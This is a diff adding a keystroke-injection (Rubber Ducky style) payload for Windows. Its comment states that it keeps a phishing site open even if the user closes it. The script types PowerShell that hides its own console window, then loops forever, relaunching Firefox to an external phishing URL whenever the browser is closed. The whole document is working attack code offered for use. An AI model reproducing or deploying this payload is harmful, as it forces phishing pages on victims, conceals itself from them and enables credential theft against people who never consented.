@@ -1,0 +1,40 @@
+REM Keeping open a phishing site even if the user closes it
+DELAY 300
+WINDOWS r
+DELAY 200
+STRING powershell
+DELAY 200
+ENTER
+DELAY 200
+STRING Add-Type -Name Window -Namespace Console -MemberDefinition '
+SHIFT-ENTER
+STRING [DllImport("Kernel32.dll")]
+SHIFT-ENTER
+STRING public static extern IntPtr GetConsoleWindow();
+SHIFT-ENTER
+STRING [DllImport("user32.dll")]
+SHIFT-ENTER
+STRING public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+SHIFT-ENTER
+STRING '
+SHIFT-ENTER
+STRING $consoleWindow = [Console.Window]::GetConsoleWindow()
+SHIFT-ENTER
+STRING [Console.Window]::ShowWindow($consoleWindow, 0)
+SHIFT-ENTER
+STRING $url = "https://dominant-coral-og3hanewqe.edgeone.app/"
+SHIFT-ENTER
+STRING while ($true) {
+SHIFT-ENTER
+STRING $firefox = Get-Process -Name "firefox" -ErrorAction SilentlyContinue
+SHIFT-ENTER
+STRING if (-not $firefox) {
+SHIFT-ENTER
+STRING Start-Process "firefox" -ArgumentList $url
+SHIFT-ENTER
+STRING }
+SHIFT-ENTER
+STRING Start-Sleep -Seconds 1
+SHIFT-ENTER
+STRING }
+ENTER
